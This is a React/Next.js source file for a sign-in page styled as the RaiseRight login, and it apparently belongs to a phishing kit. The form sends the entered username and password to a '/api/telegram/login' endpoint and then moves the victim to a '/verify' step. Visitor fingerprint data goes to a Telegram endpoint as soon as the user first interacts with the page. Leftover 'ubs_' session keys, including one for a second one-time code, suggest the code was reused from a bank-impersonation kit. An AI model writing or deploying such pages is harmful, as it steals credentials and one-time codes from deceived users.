"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const handleSignIn = async (event: any) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <div className="min-h-screen bg-white font-raiseright text-[#243b5a]">
      <header className="w-full bg-white border-b border-white shadow-lg">
        <div className="flex w-full items-center justify-center h-27 md:h-30">
          <img
            src="/raiseright/images/logo.svg"
            alt="RaiseRight"
            className="w-83 h-auto md:w-95 object-contain"
          />
        </div>
      </header>

      <main className="mt-10">
        <section className="mx-auto w-full max-w-lg px-6 pt-16 sm:px-8 sm:pt-20">
          <h1 className="mb-10 text-center text-5xl font-light tracking-tight text-[#294d73]">
            Sign In
          </h1>

          <form onSubmit={handleSignIn}>
            <div className="mb-6">
              <div className="bg-gray-50">
                <label
                  htmlFor="username"
                  className="mb-2 block text-base font-medium text-[#28577f] px-3"
                >
                  Username
                </label>
                <input
                  id="username"
                  type="text"
                  placeholder="Enter username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border-0 border-b border-[#28577f] px-2 pb-2 text-lg text-gray-600 outline-none placeholder:text-gray-500 bg-gray-50"
                />
              </div>

              <div className="mt-2 flex justify-end">
                <button
                  type="button"
                  onClick={() => router.push("/forgot-id")}
                  className="text-md text-[#1d64a3] underline underline-offset-2 hover:text-[#16496f] font-semibold"
                >
                  Forgot Username
                </button>
              </div>
            </div>

            <div className="mb-15">
              <div className="bg-gray-50">
                <label
                  htmlFor="password"
                  className="mb-2 block text-base font-medium text-[#28577f] px-3"
                >
                  Password
                </label>

                <div className="flex items-center border-b border-[#28577f]">
                  <input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full border-0 px-2 pb-2 text-lg text-gray-600 outline-none placeholder:text-gray-500 bg-gray-50"
                  />

                  <button
                    id="showPassword"
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="mb-2 ml-3 shrink-0 text-lg text-gray-600 hover:text-[#1d64a3]"
                  >
                    {showPassword ? "HIDE" : "SHOW"}
                  </button>
                </div>
              </div>
              <div className="mt-2 flex justify-end">
                <button
                  type="button"
                  onClick={() => router.push("/forgot-password")}
                  className="text-md text-[#1d64a3] underline underline-offset-2 hover:text-[#16496f] font-semibold"
                >
                  Forgot Password
                </button>
              </div>
            </div>

            {loginError && (
              <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded">
                {loginError}
              </div>
            )}

            <button
              type="submit"
              disabled={isLoginLoading}
              className="h-16 w-full rounded-full bg-[#1d64a3] text-xl font-semibold text-white transition hover:bg-[#076db7] active:scale-[0.99] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoginLoading ? "Signing in..." : "Sign In"}
            </button>
          </form>

          <div className="mt-4 text-center">
            <button
              type="button"
              onClick={() => router.back()}
              className="text-xl text-[#28577f] underline underline-offset-2 hover:text-[#16496f]"
            >
              Back
            </button>
          </div>

          <div className="mt-6 text-center">
            <p className="mb-6 text-xl text-gray-600">Don't have an account?</p>
            <button
              type="button"
              onClick={() => router.push("/new-user")}
              className="pb-20 text-xl text-[#28577f] underline underline-offset-2 hover:text-[#16496f]"
            >
              Enroll Here
            </button>
          </div>
        </section>
      </main>
    </div>
  );
}
